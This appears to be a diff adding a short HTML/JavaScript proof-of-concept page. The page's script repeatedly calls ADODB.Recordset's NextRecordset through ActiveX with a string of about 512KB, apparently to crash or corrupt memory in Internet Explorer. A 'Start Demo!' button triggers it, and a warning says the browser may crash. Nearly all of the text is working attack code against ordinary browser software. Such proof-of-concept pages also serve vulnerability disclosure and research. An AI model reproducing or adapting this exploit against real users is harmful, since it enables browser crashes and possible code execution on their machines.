@@ -1,0 +1,13 @@
+function Demo() {
+	var a = new ActiveXObject('ADODB.Recordset');
+	var b = 'XXXX';
+	while (b.length <= 1024*512) b+=b;
+
+	for (var i = 0; i < 32768; i++)
+		try { a.NextRecordset(b); } catch(e) {}
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
